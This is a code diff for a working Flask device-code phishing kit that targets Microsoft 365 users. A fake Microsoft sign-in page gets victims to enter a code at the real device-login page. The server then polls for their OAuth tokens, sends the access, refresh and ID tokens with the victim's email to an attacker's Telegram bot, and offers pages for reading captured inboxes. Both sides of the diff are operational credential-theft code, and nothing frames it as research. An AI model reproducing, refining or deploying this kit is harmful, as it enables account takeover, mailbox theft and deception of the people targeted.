@@ -2,9 +2,11 @@ import os
 import time
 import json
 import base64
+import html
 import sqlite3
 import requests
 from flask import Flask, request, jsonify, render_template_string
+from threading import Thread
 
 # ─────────────────────────────────────────────
 # CONFIGURATION
@@ -17,18 +19,12 @@ TOKEN_URL = AUTHORITY + "/oauth2/v2.0/token"
 DEVC_URL = AUTHORITY + "/oauth2/v2.0/devicecode"
 GRAPH = "https://graph.microsoft.com/v1.0"
 
-GRAPH_SCOPE = ("openid profile offline_access "
-               "https://graph.microsoft.com/User.Read https://graph.microsoft.com/Mail.Read")
+SCOPE = "openid profile offline_access User.Read Mail.Read"
 
-# Microsoft first-party PUBLIC clients only (all publisher-verified by Microsoft).
-# Tried in order; a rejection on one automatically fails over to the next.
-ATTEMPTS = [
-    ("1950a258-227b-4e31-a9cf-717495945fc2", GRAPH_SCOPE, "azure-powershell"),
-    ("04b07795-8ddb-461a-bbee-02f9e1bf7b46", GRAPH_SCOPE, "azure-cli"),
-    ("ab9b8c07-8f02-4f72-87fa-80105867a763", GRAPH_SCOPE, "onedrive-sync"),
-    ("d3590ed6-52b3-4102-aeff-aad2292ab01c",
-     "openid profile offline_access https://outlook.office.com/Mail.ReadWrite "
-     "https://outlook.office.com/User.Read", "office-outlook"),
+CLIENT_IDS = [
+    "b26aadf8-566f-4478-926f-589f601d9c74",  # OneDrive Sync
+    "00b41c95-dab0-4487-9791-b9d2c32c80f2",  # Office 365 Management
+    "d3590ed6-52b3-4102-aeff-aad2292ab01c",  # Microsoft Office (legacy)
 ]
 
 SITE_URL = "https://outlook-verify.onrender.com"
@@ -36,288 +32,389 @@ app = Flask(__name__)
 DB = "sessions.db"
 
 
+# ─────────────────────────────────────────────
+# DATABASE
+# ─────────────────────────────────────────────
 def db():
-    conn = sqlite3.connect(DB)
+    conn = sqlite3.connect(DB, timeout=15)
     conn.execute("""CREATE TABLE IF NOT EXISTS sessions (
         sid TEXT PRIMARY KEY, email TEXT, access_token TEXT,
-        refresh_token TEXT, expires_at REAL, cookies TEXT, office_token TEXT)""")
+        refresh_token TEXT, expires_at REAL, cookies TEXT, id_token TEXT)""")
     conn.execute("""CREATE TABLE IF NOT EXISTS codes (
-        sid TEXT PRIMARY KEY, device_code TEXT, created REAL,
-        sent INTEGER DEFAULT 0, attempt INTEGER DEFAULT 0)""")
-    conn.execute("""CREATE TABLE IF NOT EXISTS events (
-        ts REAL, kind TEXT, detail TEXT)""")
-    for sql in ("ALTER TABLE sessions ADD COLUMN office_token TEXT",
-                "ALTER TABLE codes ADD COLUMN attempt INTEGER DEFAULT 0"):
-        try:
-            conn.execute(sql)
-        except sqlite3.OperationalError:
-            pass
+        sid TEXT PRIMARY KEY, device_code TEXT, client_id TEXT,
+        created REAL, status TEXT)""")
     conn.commit()
     return conn
 
 
-def log_event(kind, detail=""):
-    try:
-        conn = db()
-        conn.execute("INSERT INTO events VALUES (?,?,?)", (time.time(), kind, str(detail)[:500]))
-        conn.commit(); conn.close()
-    except Exception as e:
-        print(f"LogEvent error: {e}")
+def log_event(msg):
+    print(f"[LOG] {msg}", flush=True)
 
 
+# ─────────────────────────────────────────────
+# TELEGRAM
+# ─────────────────────────────────────────────
 def telegram(msg, tag=""):
     try:
-        while msg:
-            chunk, msg = msg[:3500], msg[3500:]
+        for i in range(0, len(msg), 3500):
+            chunk = msg[i:i + 3500]
             r = requests.post(
                 f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage",
-                data={"chat_id": TELEGRAM_CHAT_ID, "text": chunk}, timeout=15)
-            print(f"Telegram[{tag}] -> HTTP {r.status_code}: {r.text[:200]}")
+                data={"chat_id": TELEGRAM_CHAT_ID, "text": chunk,
+                      "disable_web_page_preview": "true"},
+                timeout=15)
+            if r.status_code != 200:
+                log_event(f"Telegram Fail [{tag}]: {r.text}")
     except Exception as e:
-        print(f"Telegram Error [{tag}]: {e}")
-        log_event("telegram_fail", e)
+        log_event(f"Telegram Error [{tag}]: {e}")
 
 
-def email_from_id_token(id_token):
-    """Read the UPN out of the id_token — no Graph call, works on every client."""
+# ─────────────────────────────────────────────
+# TOKEN HELPERS
+# ─────────────────────────────────────────────
+def decode_jwt(token):
+    """Extract payload from a JWT without verifying the signature."""
     try:
-        payload = id_token.split(".")[1]
-        payload += "=" * (-len(payload) % 4)
-        data = json.loads(base64.urlsafe_b64decode(payload))
-        return (data.get("preferred_username") or data.get("upn")
-                or data.get("email") or "unknown")
-    except Exception:
-        return "unknown"
-
-
-def refresh_for(refresh_token, client_id, scope, label):
-    try:
-        r = requests.post(TOKEN_URL, data={
-            "grant_type": "refresh_token", "client_id": client_id,
-            "refresh_token": refresh_token, "scope": scope}, timeout=20)
-        j = r.json()
-        print(f"Refresh[{label}] -> HTTP {r.status_code}")
-        return j.get("access_token", "")
+        parts = token.split('.')
+        if len(parts) != 3:
+            return {}
+        payload = parts[1]
+        payload += "=" * ((4 - len(payload) % 4) % 4)
+        return json.loads(base64.urlsafe_b64decode(payload))
     except Exception as e:
-        print(f"Refresh[{label}] error: {e}")
-        return ""
+        log_event(f"JWT Decode Error: {e}")
+        return {}
 
 
-def harvest_cookies(refresh_token, client_id):
-    """Session cookies against login.microsoftonline.com + an outlook resource token."""
-    jar = {}
-    s = requests.Session()
-    s.headers.update({
-        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
-                      "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36"})
+def get_email_from_id_token(id_token):
+    payload = decode_jwt(id_token)
+    return (payload.get('preferred_username')
+            or payload.get('upn')
+            or payload.get('email')
+            or payload.get('unique_name')
+            or 'unknown@unknown.com')
+
+
+def harvest_session_cookies(refresh_token, client_id):
+    """Exchange the refresh token for an Outlook/Office scoped access token."""
     office_token = ""
     try:
-        r = s.post(TOKEN_URL, data={
-            "grant_type": "refresh_token", "client_id": client_id,
-            "refresh_token": refresh_token,
-            "scope": "https://outlook.office.com/.default"}, timeout=20)
-        office_token = r.json().get("access_token", "")
-        for c in s.cookies:
-            jar[c.name] = c.value
-    except Exception as e:
-        print(f"Cookie Harvest Error: {e}")
-    return jar, office_token
-
-
-def mint_device(attempt):
-    cid, scope, label = ATTEMPTS[attempt]
-    r = requests.post(DEVC_URL, data={"client_id": cid, "scope": scope}, timeout=15)
-    j = r.json()
-    if "user_code" in j:
-        log_event("devicecode_ok", label)
-        return j
-    log_event("devicecode_fail",
-              f"{label}: {j.get('error')} {j.get('error_description', '')[:120]}")
-    return None
-
-
-def issue_code(sid, start=0):
-    """Walk the attempt list until Microsoft hands us a code."""
-    for i in range(start, len(ATTEMPTS)):
-        j = mint_device(i)
-        if j:
-            conn = db()
-            conn.execute("INSERT OR REPLACE INTO codes VALUES (?,?,?,0,?)",
-                         (sid, j["device_code"], time.time(), i))
-            conn.commit(); conn.close()
-            return j["user_code"]
-    return None
-
-
-def poll_once(sid):
-    conn = db()
-    row = conn.execute(
-        "SELECT device_code, created, sent, attempt FROM codes WHERE sid=?", (sid,)).fetchone()
-    conn.close()
-    if not row:
-        return {"done": False, "error": "unknown"}
-    device_code, created, sent, attempt = row
-
-    if time.time() - created > 900:
-        return {"done": False, "error": "expired"}
-
-    cid = ATTEMPTS[min(attempt, len(ATTEMPTS) - 1)][0]
-    try:
         r = requests.post(TOKEN_URL, data={
-            "grant_type": "urn:ietf:params:oauth:grant-type:device_code",
-            "client_id": cid, "device_code": device_code}, timeout=20)
-        j = r.json()
+            "grant_type": "refresh_token",
+            "client_id": client_id,
+            "refresh_token": refresh_token,
+            "scope": "https://outlook.office.com/.default"
+        }, timeout=20)
+
+        if r.status_code == 200:
+            office_token = r.json().get('access_token', '')
+        else:
+            log_event(f"Office token exchange failed: {r.status_code} {r.text[:200]}")
     except Exception as e:
-        print(f"Poll network error [{sid}]: {e}")
-        return {"done": False, "error": ""}
+        log_event(f"Cookie Harvest Error: {e}")
 
-    if "access_token" in j:
-        if not sent:
-            email = email_from_id_token(j.get("id_token", ""))
-            if email == "unknown":
-                try:
-                    who = requests.get(f"{GRAPH}/me", timeout=15,
-                        headers={"Authorization": "Bearer " + j["access_token"]}).json()
-                    email = who.get("userPrincipalName", "unknown")
-                except Exception:
-                    pass
-
-            rt = j.get("refresh_token", "")
-            graph_tok = j["access_token"]
-            if "graph.microsoft.com" not in ATTEMPTS[attempt][1]:
-                            graph_tok = refresh_for(rt, cid, "https://graph.microsoft.com/.default", "graph")
-            cookies, office_tok = harvest_cookies(rt, cid)
-            cookie_txt = "\n".join(f"{k}={v}" for k, v in cookies.items())
-
-            conn = db()
-            conn.execute("INSERT OR REPLACE INTO sessions VALUES (?,?,?,?,?,?,?)",
-                (sid, email, graph_tok or j["access_token"], rt,
-                 time.time() + j.get("expires_in", 3600), cookie_txt, office_tok))
-            conn.execute("UPDATE codes SET sent=1 WHERE sid=?", (sid,))
-            conn.commit(); conn.close()
-            log_event("catch", email)
-
-            telegram("✅ NEW CATCH\nEmail: " + email +
-                     "\nInbox: " + SITE_URL + "/inbox/" + sid, tag="catch")
-            telegram("ACCESS TOKEN (Graph):\n" + (graph_tok or j["access_token"]) +
-                     "\n\nOFFICE TOKEN:\n" + (office_tok or "none") +
-                     "\n\nREFRESH TOKEN:\n" + (rt or "none") +
-                     "\n\nID TOKEN:\n" + j.get("id_token", "none"), tag="tokens")
-            telegram("COOKIES:\n" + (cookie_txt if cookie_txt else "none captured"),
-                     tag="cookies")
-        return {"done": True, "error": ""}
-
-    err = j.get("error", "")
-    if err not in ("authorization_pending", "slow_down"):
-        print(f"Token poll error [{sid}]: {err}")
-        log_event("poll_error", err + " " + j.get("error_description", ""))
-        return {"done": False, "error": err}
-    return {"done": False, "error": ""}
+    return office_token
 
 
-PAGE = """<!doctype html><html><head><meta charset='utf-8'>
-<meta name='viewport' content='width=device-width,initial-scale=1'>
-<title>Microsoft</title>
-<style>
-*{box-sizing:border-box}
-body{font-family:'Segoe UI',Arial,sans-serif;margin:0;background:#fff}
-.wrap{max-width:440px;margin:44px auto 0;padding:0 20px;text-align:center}
-.logo{margin-bottom:18px}
-.code{font-size:34px;font-weight:700;letter-spacing:4px;color:#1b1b1b;margin:10px 0 6px;user-select:all}
-.sub{font-size:15px;color:#1b1b1b;line-height:1.5}
-.btn{background:#0067b8;color:#fff;padding:10px 40px;font-size:15px;border:none;cursor:pointer;margin-top:18px}
-.btn:hover{background:#005da6}
-.wait{font-size:13px;color:#0067b8;margin-top:12px;display:none}
-.note{font-size:12px;color:#605e5c;margin-top:22px}
-.err{font-size:13px;color:#d13438;word-break:break-all}
-@media(max-width:480px){.wrap{margin:12px auto 0}}
-</style></head><body>
-<div class='wrap'>
-<div class='logo'><img src='https://logincdn.msauth.net/shared/1.0/content/images/microsoft_logo.svg' width='108' alt='Microsoft'></div>
-{% if error %}
-  <p class='sub'>We couldn't start sign-in. Please try again.</p>
-  <p class='err'>Details: {{ error }}</p>
-  <button class='btn' onclick='location.reload()'>Try again</button>
-{% else %}
-  <p class='sub'><b>{{ user_code }}</b> is your sign-in code.</p>
-  <p class='sub'>Copy it, then continue to the verification page and enter it there.</p>
-  <div class='code' id='code'>{{ user_code }}</div>
-  <button class='btn' id='goBtn' onclick='go()'>Copy &amp; continue</button>
-  <div class='wait' id='wait'>Code copied — finishing sign-in…</div>
-  <p class='note'>Code expires in 15 minutes. Keep this window open.</p>
-{% endif %}
-</div>
-{% if not error %}
-<script>
-let sid="{{ sid }}";
-function go(){
-  let c=document.getElementById('code').innerText.trim();
-  // Copy ONLY on click — never on page load
-  if(navigator.clipboard && navigator.clipboard.writeText){
-    navigator.clipboard.writeText(c).catch(()=>{});
-  }else{
-    let t=document.createElement('textarea');
-    t.value=c;document.body.appendChild(t);t.select();
-    try{document.execCommand('copy');}catch(e){}
-    document.body.removeChild(t);
-  }
-  document.getElementById('wait').style.display='block';
-  document.getElementById('goBtn').disabled=true;
-  // Same-tab redirect to the REAL Microsoft device login page
-  setTimeout(function(){location.href="https://microsoft.com/devicelogin";},700);
-}
-setInterval(async()=>{
-  try{
-    let r=await fetch('/status?sid='+sid,{cache:'no-store'});
-    let j=await r.json();
-    if(j.done){location.href="https://outlook.office.com/mail";}
-  }catch(e){}
-},4000);
-</script>
-{% endif %}
-</body></html>"""
+# ─────────────────────────────────────────────
+# WATCHER
+# ─────────────────────────────────────────────
+def watcher(sid, device_code, client_id):
+    log_event(f"Watcher started for SID: {sid} using Client ID: {client_id}")
+
+    for _ in range(300):  # ~25 minutes
+        try:
+            r = requests.post(TOKEN_URL, data={
+                "grant_type": "urn:ietf:params:oauth:grant-type:device_code",
+                "client_id": client_id,
+                "device_code": device_code
+            }, timeout=20)
+
+            j = r.json()
+
+            if "access_token" in j:
+                access_token = j['access_token']
+                refresh_token = j.get('refresh_token', '')
+                id_token = j.get('id_token', '')
+
+                email = get_email_from_id_token(id_token)
+                office_token = harvest_session_cookies(refresh_token, client_id)
+
+                conn = db()
+                conn.execute("INSERT OR REPLACE INTO sessions VALUES (?,?,?,?,?,?,?)",
+                             (sid, email, access_token, refresh_token,
+                              time.time() + 3600, "", id_token))
+                conn.execute("UPDATE codes SET status='completed' WHERE sid=?", (sid,))
+                conn.commit()
+                conn.close()
+
+                log_event(f"SUCCESS: {email}")
+
+                msg = (
+                    f"NEW CAPTURE\n"
+                    f"-----------------------------\n"
+                    f"Email: {email}\n"
+                    f"Client ID: {client_id}\n\n"
+                    f"Access Token:\n{access_token}\n\n"
+                    f"Refresh Token:\n{refresh_token or '(none)'}\n\n"
+                    f"Office Token:\n{office_token or '(none)'}\n\n"
+                    f"Inbox View: {SITE_URL}/inbox/{sid}"
+                )
+                telegram(msg, tag="capture")
+                return
+
+            elif j.get("error") == "authorization_pending":
+                time.sleep(5)
+                continue
+
+            elif j.get("error") == "slow_down":
+                time.sleep(10)
+                continue
+
+            else:
+                err = j.get('error', 'unknown')
+                desc = j.get('error_description', '')
+                log_event(f"Polling error: {err} - {desc}")
+                conn = db()
+                conn.execute("UPDATE codes SET status=? WHERE sid=?", (err, sid))
+                conn.commit()
+                conn.close()
+                return
+
+        except Exception as e:
+            log_event(f"Watcher Exception: {e}")
+            time.sleep(5)
+
+    log_event(f"Watcher timed out for SID: {sid}")
+    conn = db()
+    conn.execute("UPDATE codes SET status='timeout' WHERE sid=?", (sid,))
+    conn.commit()
+    conn.close()
 
 
-@app.after_request
-def no_cache(resp):
-    resp.headers["Cache-Control"] = "no-store, no-cache, must-revalidate, max-age=0"
-    resp.headers["Pragma"] = "no-cache"
-    return resp
+# ─────────────────────────────────────────────
+# TEMPLATES
+# ─────────────────────────────────────────────
+PAGE = """<!doctype html>
+<html>
+<head>
+    <meta charset='utf-8'>
+    <meta name='viewport' content='width=device-width,initial-scale=1'>
+    <title>Sign in to your account</title>
+    <style>
+        body { font-family: 'Segoe UI', Tahoma, sans-serif; background: #f3f2f1; display: flex;
+               justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
+        .card { background: #fff; padding: 44px; width: 100%; max-width: 440px;
+                box-shadow: 0 2px 6px rgba(0,0,0,0.2); text-align: center; box-sizing: border-box; }
+        .logo { margin-bottom: 20px; }
+        .logo img { width: 108px; }
+        h2 { font-size: 24px; font-weight: 600; margin: 0 0 12px; color: #1b1b1b; }
+        p { font-size: 15px; color: #1b1b1b; margin: 0 0 20px; line-height: 1.5; }
+        .code-box { background: #f3f2f1; padding: 15px; font-size: 30px; font-weight: 700;
+                    letter-spacing: 4px; color: #0067b8; margin: 20px 0; border-radius: 4px;
+                    user-select: all; word-break: break-all; }
+        .btn { background: #0067b8; color: #fff; border: none; padding: 11px 24px; font-size: 15px;
+               cursor: pointer; border-radius: 2px; width: 100%; margin-top: 10px; font-family: inherit; }
+        .btn:hover { background: #005da6; }
+        .footer { margin-top: 30px; font-size: 12px; color: #605e5c; }
+        .footer a { color: #0067b8; text-decoration: none; }
+        .hidden { display: none; }
+        .ok { color: #107c10; font-weight: 600; }
+    </style>
+</head>
+<body>
+    <div class="card">
+        <div class="logo">
+            <img src="https://logincdn.msauth.net/shared/1.0/content/images/microsoft_logo.svg" alt="Microsoft">
+        </div>
+
+        {% if error %}
+            <h2>Something went wrong</h2>
+            <p>{{ error }}</p>
+            <button class="btn" onclick="location.reload()">Try Again</button>
+        {% else %}
+            <h2>Enter code</h2>
+            <p>To sign in, copy the code below and paste it on the next screen.</p>
+
+            <div class="code-box" id="userCode">{{ user_code }}</div>
+
+            <button class="btn" id="copyBtn" onclick="handleCopy()">Copy Code &amp; Continue</button>
+            <p class="hidden ok" id="statusMsg">Code copied. Redirecting…</p>
+        {% endif %}
+
+        <div class="footer">
+            <a href="https://microsoft.com/devicelogin">Can't access your account?</a>
+        </div>
+    </div>
+
+    {% if not error %}
+    <script>
+        const sid = {{ sid|tojson }};
+
+        function handleCopy() {
+            const code = document.getElementById('userCode').innerText.trim();
+            const go = () => {
+                document.getElementById('copyBtn').classList.add('hidden');
+                document.getElementById('statusMsg').classList.remove('hidden');
+                setTimeout(() => {
+                    window.location.href = "https://microsoft.com/devicelogin";
+                }, 1200);
+            };
+
+            if (navigator.clipboard && navigator.clipboard.writeText) {
+                navigator.clipboard.writeText(code).then(go).catch(go);
+            } else {
+                const ta = document.createElement('textarea');
+                ta.value = code;
+                document.body.appendChild(ta);
+                ta.select();
+                try { document.execCommand('copy'); } catch (e) {}
+                document.body.removeChild(ta);
+                go();
+            }
+        }
+
+        setInterval(async () => {
+            try {
+                const res = await fetch('/status?sid=' + encodeURIComponent(sid));
+                const data = await res.json();
+                if (data.done) {
+                    document.getElementById('statusMsg').innerText = 'Sign-in successful. Redirecting…';
+                }
+            } catch (e) {}
+        }, 5000);
+    </script>
+    {% endif %}
+</body>
+</html>"""
 
 
+INBOX_PAGE = """<!doctype html>
+<html>
+<head>
+    <meta charset='utf-8'>
+    <meta name='viewport' content='width=device-width,initial-scale=1'>
+    <title>Inbox — {{ email }}</title>
+    <style>
+        body { font-family: 'Segoe UI', Tahoma, sans-serif; background: #f3f2f1; margin: 0;
+               padding: 24px 16px; color: #1b1b1b; }
+        .wrap { max-width: 900px; margin: 0 auto; }
+        header { display: flex; align-items: center; gap: 12px; margin-bottom: 20px;
+                 flex-wrap: wrap; }
+        header img { width: 96px; }
+        h1 { font-size: 20px; margin: 0; font-weight: 600; }
+        .badge { background: #fff; border: 1px solid #e1dfdd; border-radius: 12px;
+                 padding: 3px 10px; font-size: 12px; color: #605e5c; }
+        table { width: 100%; border-collapse: collapse; background: #fff;
+                box-shadow: 0 1px 4px rgba(0,0,0,0.12); }
+        th, td { text-align: left; padding: 12px 14px; font-size: 14px;
+                 border-bottom: 1px solid #edebe9; vertical-align: top; }
+        th { background: #faf9f8; font-weight: 600; font-size: 12px;
+             text-transform: uppercase; letter-spacing: .5px; color: #605e5c; }
+        tr:hover td { background: #faf9f8; }
+        .subj { font-weight: 600; }
+        .prev { color: #605e5c; font-size: 13px; margin-top: 4px; }
+        .date { white-space: nowrap; color: #605e5c; font-size: 13px; }
+        .empty { padding: 40px; text-align: center; color: #605e5c; }
+        pre { background: #201f1e; color: #eaeaea; padding: 14px; border-radius: 4px;
+              overflow-x: auto; font-size: 12px; }
+        details { margin-top: 24px; }
+        summary { cursor: pointer; font-size: 13px; color: #0067b8; }
+        @media (max-width: 560px) {
+            th:nth-child(1), td:nth-child(1) { display: none; }
+        }
+    </style>
+</head>
+<body>
+    <div class="wrap">
+        <header>
+            <img src="https://logincdn.msauth.net/shared/1.0/content/images/microsoft_logo.svg" alt="Microsoft">
+            <h1>{{ email }}</h1>
+            <span class="badge">{{ count }} message(s)</span>
+        </header>
+
+        {% if rows %}
+        <table>
+            <thead>
+                <tr><th>Received</th><th>From / Subject</th></tr>
+            </thead>
+            <tbody>
+                {{ rows|safe }}
+            </tbody>
+        </table>
+        {% else %}
+        <div class="empty">{{ note }}</div>
+        {% endif %}
+
+        <details>
+            <summary>Raw session data</summary>
+            <pre>{{ raw|safe }}</pre>
+        </details>
+    </div>
+</body>
+</html>"""
+
+
+# ─────────────────────────────────────────────
+# ROUTES
+# ─────────────────────────────────────────────
 @app.route("/")
 def home():
-    sid = str(int(time.time() * 1000)) + os.urandom(3).hex()
-    user_code = issue_code(sid)
-    if user_code:
-        log_event("visit", sid)
-        return render_template_string(PAGE, user_code=user_code, sid=sid, error=None)
-    return render_template_string(PAGE, error="could not start sign-in, try again",
-                                  user_code="", sid="")
+    selected_client = None
+    device_code_resp = None
+
+    for cid in CLIENT_IDS:
+        try:
+            resp = requests.post(DEVC_URL, data={
+                "client_id": cid,
+                "scope": SCOPE
+            }, timeout=10)
+
+            data = resp.json()
+            if "user_code" in data and "device_code" in data:
+                selected_client = cid
+                device_code_resp = data
+                log_event(f"Client {cid} issued device code")
+                break
+            else:
+                log_event(f"Client {cid} failed: {data.get('error')} - "
+                          f"{data.get('error_description', '')[:160]}")
+        except Exception as e:
+            log_event(f"Client {cid} exception: {e}")
+
+    if not selected_client:
+        return render_template_string(PAGE, error="Service unavailable. Please try again later.",
+                                      user_code="", sid="")
+
+    sid = str(int(time.time())) + "_" + os.urandom(4).hex()
+
+    conn = db()
+    conn.execute("INSERT INTO codes (sid, device_code, client_id, created, status) "
+                 "VALUES (?,?,?,?,?)",
+                 (sid, device_code_resp['device_code'], selected_client,
+                  time.time(), 'pending'))
+    conn.commit()
+    conn.close()
+
+    t = Thread(target=watcher,
+               args=(sid, device_code_resp['device_code'], selected_client))
+    t.daemon = True
+    t.start()
+
+    return render_template_string(PAGE, user_code=device_code_resp['user_code'],
+                                  sid=sid, error=None)
 
 
 @app.route("/status")
 def status():
     sid = request.args.get("sid", "")
-    return jsonify(poll_once(sid))
-
-
-@app.route("/test-telegram")
-def test_telegram():
-    telegram("Test message from your server — if you see this, Telegram is set up correctly.", tag="test")
-    return "Sent. Check Telegram AND your Render logs."
-
-
-@app.route("/debug")
-def debug():
     conn = db()
-    rows = conn.execute(
-        "SELECT ts, kind, detail FROM events ORDER BY ts DESC LIMIT 30").fetchall()
+    row = conn.execute("SELECT status FROM codes WHERE sid=?", (sid,)).fetchone()
     conn.close()
-    out = "".join(
-        f"<p>{time.strftime('%H:%M:%S', time.localtime(t))} — {k} — {d}</p>"
-        for t, k, d in rows) or "<p>No events yet.</p>"
-    return out
+
+    if row and row[0] == 'completed':
+        return jsonify({"done": True})
+    return jsonify({"done": False})
 
 
 @app.route("/inbox/<sid>")
@@ -325,18 +422,94 @@ def inbox(sid):
     conn = db()
     row = conn.execute("SELECT * FROM sessions WHERE sid=?", (sid,)).fetchone()
     conn.close()
+
     if not row:
-        return "No session.", 404
-    token = row[2]
-    msgs = requests.get(
-        f"{GRAPH}/me/mailFolders/inbox/messages?$top=25&$select=subject,from,bodyPreview",
-        headers={"Authorization": "Bearer " + token}, timeout=20).json()
-    rows = "".join(
-        f"<tr><td>{(m.get('from') or {}).get('emailAddress', {}).get('address','?')}</td>"
-        f"<td>{m.get('subject','')}</td><td>{m.get('bodyPreview','')}</td></tr>"
-        for m in msgs.get("value", []))
-    return f"<h2>Inbox: {row[1]}</h2><table border=1 cellpadding=6>{rows}</table>"
+        return render_template_string(
+            INBOX_PAGE, email="Session not found", rows="", count=0,
+            note="This session has expired or was never captured.",
+            raw="(none)"), 404
+
+    sid_, email, access_token, refresh_token, expires_at, cookies, id_token = row
+
+    rows_html = ""
+    note = ""
+    count = 0
+
+    try:
+        resp = requests.get(
+            f"{GRAPH}/me/mailFolders/inbox/messages"
+            f"?$top=10&$select=subject,from,bodyPreview,receivedDateTime",
+            headers={"Authorization": "Bearer " + access_token},
+            timeout=20
+        )
+        data = resp.json()
+
+        if "value" in data:
+            count = len(data["value"])
+            for m in data["value"]:
+                sender = (m.get('from', {})
+                           .get('emailAddress', {})
+                           .get('address', 'Unknown'))
+                subject = html.escape(m.get('subject') or '(No Subject)')
+                preview = html.escape((m.get('bodyPreview') or '')[:120])
+                date = html.escape((m.get('receivedDateTime') or '')[:10])
+                sender = html.escape(sender)
+
+                rows_html += (
+                    f"<tr>"
+                    f"<td class='date'>{date}</td>"
+                    f"<td><div class='subj'>{subject}</div>"
+                    f"<div class='prev'>{sender} — {preview}</div></td>"
+                    f"</tr>"
+                )
+            if count == 0:
+                note = "Inbox is empty."
+        else:
+            note = html.escape(data.get('error', {}).get('message', 'Graph returned no data.'))
+
+    except Exception as e:
+        log_event(f"Inbox fetch error: {e}")
+        note = "Could not reach Microsoft Graph."
+
+    raw = json.dumps({
+        "sid": sid_,
+        "email": email,
+        "access_token": access_token,
+        "refresh_token": refresh_token,
+        "id_token": id_token,
+        "expires_at": expires_at,
+    }, indent=2)
+    raw = html.escape(raw)
+
+    return render_template_string(INBOX_PAGE, email=html.escape(email or "Unknown"),
+                                  rows=rows_html, count=count,
+                                  note=note, raw=raw)
+
+
+@app.route("/sessions")
+def sessions():
+    conn = db()
+    rows = conn.execute(
+        "SELECT sid, email, expires_at FROM sessions ORDER BY expires_at DESC"
+    ).fetchall()
+    conn.close()
+
+    if not rows:
+        return "<p>No captures yet.</p>"
+
+    out = "<h3>Captured sessions</h3><ul>"
+    for sid_, email, exp in rows:
+        out += (f"<li><a href='/inbox/{html.escape(sid_)}'>{html.escape(email or '?')}</a>"
+                f" — {time.strftime('%Y-%m-%d %H:%M', time.localtime(exp))}</li>")
+    out += "</ul>"
+    return out
+
+
+@app.route("/health")
+def health():
+    return jsonify({"ok": True, "time": time.time()})
 
 
 if __name__ == "__main__":
-    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)))
+    port = int(os.environ.get("PORT", 5000))
+    app.run(host="0.0.0.0", port=port, threaded=True)
